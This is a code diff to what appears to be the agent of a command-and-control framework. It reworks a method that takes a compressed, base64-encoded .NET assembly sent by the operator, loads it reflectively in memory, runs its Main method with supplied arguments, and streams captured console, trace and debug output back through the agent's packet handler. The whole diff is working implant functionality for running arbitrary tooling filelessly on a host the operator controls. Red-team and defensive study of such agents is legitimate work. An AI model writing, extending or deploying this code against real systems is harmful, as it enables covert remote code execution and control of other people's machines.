@@ -583,334 +583,144 @@ class MainAgent:
         self.packet_handler.send_message(self.packet_handler.build_response_packet(43, result_data, result_id))
         self.tasks[result_id]["status"] = "completed"
 
-    def csharp_execute_wait(self, data, result_id):
-        try:
-            import base64
-            import zlib
-            import time
-            import clr
-            import System.IO
-            from System import Array, Byte, Console, Object, String, Text, Char
-            from System.IO import Compression, MemoryStream, StreamWriter
-            from System.Reflection import Assembly
-            from System.Text import Encoding
-            from threading import Thread
-
-            clr.AddReference("System.Core")
-            import System.IO.Pipes
-
-            parts = data.split(",")
-
-            base64_string = ''.join(parts[1:])
-            json_string = base64.b64decode(base64_string).decode("utf-8")
-            json_object = json.loads(json_string)
-            command_array = Array[String]([str(value) for value in json_object.values()])
-
-            data_bytes = base64.b64decode(parts[0])
-
-            # Decompress the data and load the assembly
-            decoded_data = zlib.decompress(data_bytes, -15)
-            assem_bytes = Array[Byte](decoded_data)
-            assembly = Assembly.Load(assem_bytes)
-
-            # Get Program type and OutputStream property
-            program_type = assembly.GetType("Program")
-            output_stream_prop = program_type.GetProperty("OutputStream")
-
-            # Redirect OutputStream to a pipe for real-time streaming
-            if output_stream_prop:
-                # Initialize pipes for streaming
-                pipe_server_stream = System.IO.Pipes.AnonymousPipeServerStream(
-                    System.IO.Pipes.PipeDirection.In,
-                    System.IO.HandleInheritability.Inheritable
-                )
-                pipe_client_stream = System.IO.Pipes.AnonymousPipeClientStream(
-                    System.IO.Pipes.PipeDirection.Out,
-                    pipe_server_stream.GetClientHandleAsString()
-                )
-                stream_reader = System.IO.StreamReader(pipe_server_stream)
-
-                # Function to execute the main assembly method in a separate thread
-                def execute_main_method():
-                    # Create a StreamWriter for the pipe client stream to capture console output
-                    stream_writer = StreamWriter(pipe_client_stream)
-                    stream_writer.AutoFlush = True
-                    original_console_out = Console.Out  # Save the original Console.Out to restore later
-
-                    output_stream_prop.SetValue(None, pipe_client_stream, None)
-
-                    try:
-                        Console.SetOut(stream_writer)
-
-                        # Execute the Main method, which now writes to the redirected console
-                        main_method = program_type.GetMethod("Main")
-                        main_method.Invoke(None, Array[Object]([command_array]))
-
-                    except Exception as e:
-                        # Invocation error happening here but doesnt break anything
-                        pass
-
-                    finally:
-                        # Restore the original Console.Out
-                        Console.SetOut(original_console_out)
-
-                        # Dispose of the pipe client stream to close the connection
-                        if pipe_client_stream:
-                            pipe_client_stream.Dispose()
-
-                # Start the main method execution in a background thread
-                task_thread = KThread(target=execute_main_method)
-                task_thread.start()
-
-                # Function to read and send output data continuously
-                def read_output_stream():
-                    # Use Array[Byte] for binary data reading
-                    read_buffer = Array.CreateInstance(Char, 1024)
-                    output = ""
-
-                    while True:
-                        read_count = stream_reader.Read(read_buffer, 0, read_buffer.Length)
-                        if read_count == 0:
-                            break
-
-                        # Convert the byte buffer to a string and build response packet
-                        output_chunk = bytes(read_buffer[:read_count]).decode("utf-8")
-
-                        if output_chunk != "" or output_chunk is not None:
-                            output += output_chunk
-                            result_packet = self.packet_handler.build_response_packet(120, output, result_id)
-                            self.packet_handler.process_job_tasking(result_packet)
-                        time.sleep(0.1)
-
-                    self.tasks[result_id]["status"] = "completed"
-
-                # Start reading the output in another thread
-                reading_thread = KThread(target=read_output_stream)
-                reading_thread.start()
-
-                # Track task status and threads
-                self.tasks[result_id] = {
-                    "thread": task_thread,
-                    "reading_thread": reading_thread,
-                    "status": "running"
-                }
-
-            else:
-                # If no OutputStream, run the assembly method directly and wait for completion
-                from System.IO import StringWriter
-                from System import Console
-
-                # If no OutputStream, run the assembly method directly and capture console output
-                def no_stream_execute():
-                    try:
-                        # Redirect Console.Out to capture output
-                        string_writer = StringWriter()
-                        original_console_out = Console.Out
-                        Console.SetOut(string_writer)
-
-                        try:
-                            main_method = program_type.GetMethod("Main")
-                            main_method.Invoke(None, Array[Object]([command_array]))
-                        finally:
-                            Console.SetOut(original_console_out)
-
-                        # Get the captured output
-                        result = string_writer.ToString()
-
-                        # Send the result after execution completes
-                        if result:
-                            result_packet = self.packet_handler.build_response_packet(120, result, result_id)
-                            self.packet_handler.process_job_tasking(result_packet)
-                        self.tasks[result_id]["status"] = "completed"
-                    except Exception as e:
-                        error_message = "[!] Error while executing task: %s" % str(e)
-                        result_packet = self.packet_handler.build_response_packet(0, error_message, result_id)
-                        self.packet_handler.process_job_tasking(result_packet)
-                        self.tasks[result_id]["status"] = "error"
-
-                # Run in a separate thread for consistency
-                task_thread = Thread(target=no_stream_execute)
-                task_thread.start()
-
-                # Track task status
-                self.tasks[result_id] = {
-                    "thread": task_thread,
-                    "status": "running"
-                }
-
-        except Exception as e:
-            result_packet = self.packet_handler.build_response_packet(0,
-                                                                      "[!] Error while executing assembly: %s" % str(e),
-                                                                      result_id)
-            self.packet_handler.process_job_tasking(result_packet)
-            if result_id in self.tasks:
-                self.tasks[result_id]["status"] = "error"
-
-
-    # Task 122: Execute C# Assembly in Background, Stream Output Continuously
     def csharp_background_job(self, data, result_id):
         try:
-            import base64
-            import zlib
-            import time
+            import base64, zlib, json, time, System as _sys
+            from collections import OrderedDict
             import clr
-            import System.IO
-            from System import Array, Byte, Char, Console, Object, String, Text
-            from System.IO import Compression, MemoryStream, StreamWriter
-            from System.Reflection import Assembly
-            from System.Text import Encoding
-            from threading import Thread
 
+            from System import Array, Object, String, Char, Byte
+            from System import Console
+            from System.IO import StreamReader, StreamWriter
+            from System.Reflection import Assembly
+            from System.Diagnostics import Trace, Debug, TextWriterTraceListener
+            from System.Text import Encoding
             clr.AddReference("System.Core")
             import System.IO.Pipes
 
             parts = data.split(",")
+            data_bytes = base64.b64decode(parts[0])
 
             base64_string = ''.join(parts[1:])
             json_string = base64.b64decode(base64_string).decode("utf-8")
-            json_object = json.loads(json_string)
+            json_object = json.loads(json_string, object_pairs_hook=OrderedDict)
             command_array = Array[String]([str(value) for value in json_object.values()])
 
-            data_bytes = base64.b64decode(parts[0])
-
-            # Decompress the data and load the assembly
             decoded_data = zlib.decompress(data_bytes, -15)
             assem_bytes = Array[Byte](decoded_data)
             assembly = Assembly.Load(assem_bytes)
 
-            # Get Program type and OutputStream property
+            pipe_server = System.IO.Pipes.AnonymousPipeServerStream(
+                System.IO.Pipes.PipeDirection.In,
+                System.IO.HandleInheritability.Inheritable
+            )
+            pipe_client = System.IO.Pipes.AnonymousPipeClientStream(
+                System.IO.Pipes.PipeDirection.Out,
+                pipe_server.GetClientHandleAsString()
+            )
+            reader = StreamReader(pipe_server, Encoding.UTF8, True, 1024)
+
             program_type = assembly.GetType("Program")
-            output_stream_prop = program_type.GetProperty("OutputStream")
+            output_stream_prop = program_type.GetProperty("OutputStream") if program_type is not None else None
 
-            # Handle OutputStream with pipes for continuous streaming
-            if output_stream_prop:
-                # Initialize pipe streams for inter-process communication
-                pipe_server_stream = System.IO.Pipes.AnonymousPipeServerStream(
-                    System.IO.Pipes.PipeDirection.In,
-                    System.IO.HandleInheritability.Inheritable
-                )
-                pipe_client_stream = System.IO.Pipes.AnonymousPipeClientStream(
-                    System.IO.Pipes.PipeDirection.Out,
-                    pipe_server_stream.GetClientHandleAsString()
-                )
-                stream_reader = System.IO.StreamReader(pipe_server_stream)
+            def exec_main_with_piped_console():
+                sw = StreamWriter(pipe_client, Encoding.UTF8, 1024)
+                sw.AutoFlush = True
 
-                # Function to execute the main assembly method in a background thread
-                def execute_main_method():
-                    # Create a StreamWriter for the pipe client stream to capture console output
-                    stream_writer = StreamWriter(pipe_client_stream)
-                    stream_writer.AutoFlush = True
-                    original_console_out = Console.Out  # Save the original Console.Out to restore later
+                old_out, old_err = Console.Out, Console.Error
+                listener = TextWriterTraceListener(sw)
+                Trace.Listeners.Add(listener)
+                Debug.Listeners.Add(listener)
 
-                    output_stream_prop.SetValue(None, pipe_client_stream, None)
+                try:
+                    Console.SetOut(sw)
+                    Console.SetError(sw)
 
+                    if output_stream_prop is not None:
+                        output_stream_prop.SetValue(None, pipe_client, None)
+
+                    main_method = program_type.GetMethod("Main")
+                    if main_method is None:
+                        sw.WriteLine("[!] Error: Program.Main not found")
+                        sw.Flush()
+                        return
+
+                    main_method.Invoke(None, Array[Object]([command_array]))
+
+                    Console.Out.Flush()
+                    Console.Error.Flush()
+                    sw.Flush()
+
+                except Exception as e:
                     try:
-                        Console.SetOut(stream_writer)
-
-                        # Execute the Main method, which now writes to the redirected console
-                        main_method = program_type.GetMethod("Main")
-                        main_method.Invoke(None, Array[Object]([command_array]))
-
-                    except Exception as e:
-                        # Invocation error happening here but doesnt break anything
+                        sw.WriteLine("[!] Exception in exec_main_with_piped_console: {0}".format(str(e)))
+                        sw.Flush()
+                    except Exception:
                         pass
+                finally:
+                    Console.SetOut(old_out)
+                    Console.SetError(old_err)
 
-                    finally:
-                        # Restore the original Console.Out
-                        Console.SetOut(original_console_out)
+                    Trace.Listeners.Remove(listener)
+                    Debug.Listeners.Remove(listener)
+                    listener.Flush()
 
-                        # Dispose of the pipe client stream to close the connection
-                        if pipe_client_stream:
-                            pipe_client_stream.Dispose()
+                    pipe_client.Dispose()
 
-                # Start the main method execution in a background thread
-                task_thread = KThread(target=execute_main_method)
-                task_thread.start()
+            exec_thread = Thread(target=exec_main_with_piped_console)
+            exec_thread.start()
 
-                # Function to read and send output data continuously
-                def read_output_stream():
-                    # Use Array[Byte] for binary data reading
-                    read_buffer = Array.CreateInstance(Char, 1024)
-                    output = ""
+            def _send_payload_text(text_str):
+                try:
+                    pkt = self.packet_handler.build_response_packet(120, text_str, result_id)
+                    self.packet_handler.process_job_tasking(pkt)
+                    return
+                except Exception as e:
+                    err = "[!] Failed to send payload: {0}".format(str(e))
+                    pkt = self.packet_handler.build_response_packet(0, err, result_id)
+                    self.packet_handler.process_job_tasking(pkt)
 
+            def read_loop():
+                buf = Array.CreateInstance(Char, 1024)
+                accum = ""
+                try:
                     while True:
-                        read_count = stream_reader.Read(read_buffer, 0, read_buffer.Length)
-                        if read_count == 0:
+                        try:
+                            n = reader.Read(buf, 0, buf.Length)
+                        except Exception:
+                            n = 0
+
+                        if n == 0:
                             break
 
-                        # Convert the byte buffer to a string and build response packet
-                        output_chunk = bytes(read_buffer[:read_count]).decode("utf-8")
+                        # Build a pure Python str from the Char[] slice (avoid System.String)
+                        # This guarantees no .NET string/array leaks out.
+                        chunk_py = u"".join(buf[i] for i in range(n))
 
-                        if output_chunk != "" or output_chunk is not None:
-                            output += output_chunk
-                            result_packet = self.packet_handler.build_response_packet(120, output, result_id)
-                            self.packet_handler.process_job_tasking(result_packet)
-                        time.sleep(0.1)
+                        if chunk_py:
+                            accum += chunk_py
+                            _send_payload_text(accum)
 
+                        time.sleep(0.05)
+                finally:
+                    reader.Dispose()
+                    pipe_server.Dispose()
                     self.tasks[result_id]["status"] = "completed"
 
-                # Start reading the output in another thread
-                reading_thread = KThread(target=read_output_stream)
-                reading_thread.start()
+            read_thread = KThread(target=read_loop)
+            read_thread.start()
 
-                # Track task status and threads
-                self.tasks[result_id] = {
-                    "thread": task_thread,
-                    "reading_thread": reading_thread,
-                    "status": "running"
-                }
-
-            else:
-                # If no OutputStream, run the assembly method directly and wait for completion
-                from System.IO import StringWriter
-                from System import Console
-
-                # If no OutputStream, run the assembly method directly and capture console output
-                def no_stream_execute():
-                    try:
-                        # Redirect Console.Out to capture output
-                        string_writer = StringWriter()
-                        original_console_out = Console.Out
-                        Console.SetOut(string_writer)
-
-                        try:
-                            main_method = program_type.GetMethod("Main")
-                            main_method.Invoke(None, Array[Object]([command_array]))
-                        finally:
-                            Console.SetOut(original_console_out)
-
-                        # Get the captured output
-                        result = string_writer.ToString()
-
-                        # Send the result after execution completes
-                        if result:
-                            result_packet = self.packet_handler.build_response_packet(120, result, result_id)
-                            self.packet_handler.process_job_tasking(result_packet)
-                        self.tasks[result_id]["status"] = "completed"
-                    except Exception as e:
-                        error_message = "[!] Error while executing task: %s" % str(e)
-                        result_packet = self.packet_handler.build_response_packet(0, error_message, result_id)
-                        self.packet_handler.process_job_tasking(result_packet)
-                        self.tasks[result_id]["status"] = "error"
-
-                # Run in a separate thread for consistency
-                task_thread = Thread(target=no_stream_execute)
-                task_thread.start()
-
-                # Track task status
-                self.tasks[result_id] = {
-                    "thread": task_thread,
-                    "status": "running"
-                }
+            self.tasks[result_id] = {
+                "thread": exec_thread,
+                "reading_thread": read_thread,
+                "status": "running"
+            }
 
         except Exception as e:
-            result_packet = self.packet_handler.build_response_packet(0,
-                                                                      "[!] Error while executing assembly: %s" % str(e),
-                                                                      result_id)
-            self.packet_handler.process_job_tasking(result_packet)
-            if result_id in self.tasks:
-                self.tasks[result_id]["status"] = "error"
-
+            self.tasks[result_id] = {"status": "error"}
+            err = "[!] Error while starting C# background job: %s" % str(e)
+            pkt = self.packet_handler.build_response_packet(0, err, result_id)
+            self.packet_handler.process_job_tasking(pkt)
 
     def task_list(self, result_id):
         """
@@ -1728,7 +1538,7 @@ class MainAgent:
                 self.start_python_job(data, result_id)
 
             elif packet_type == 120:
-                self.csharp_execute_wait(data, result_id)
+                self.csharp_background_job(data, result_id)
 
             elif packet_type == 122:
                 self.csharp_background_job(data, result_id)
